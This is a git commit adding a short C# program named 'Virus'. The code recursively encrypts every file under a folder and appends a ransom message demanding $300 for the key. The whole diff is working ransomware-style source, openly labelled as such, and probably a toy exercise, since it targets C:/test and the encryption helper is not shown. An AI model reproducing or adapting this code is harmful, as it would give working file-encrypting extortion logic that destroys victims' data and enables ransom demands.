286ca66650d3a56a6e75caa0981ee4b6bf0f0a41
Даша Яськова <dashayaskova111@gmail.com>
2020-10-20 14:56:50 +0300

    Added implementation of virus

---
+++ Virus/Program.cs
@@ -0,0 +1,20 @@
+﻿using System;
+using System.IO;
+
+namespace Virus
+{
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			string[] allfiles = Directory.GetFiles("C:/test", "*.*", SearchOption.AllDirectories);
+
+			foreach (var file in allfiles)
+			{
+				string text = File.ReadAllText(file);
+				string newText = EncryptionHelper.Encrypt(text);
+				File.WriteAllText(file, newText + "\nHAHAHA! ALL YOUR FILES ARE ENCRYPTED!!! PAY 300$ TO GET KEY AND SAVE ALL YOUR FILES");
+			}
+		}
+	}
+}
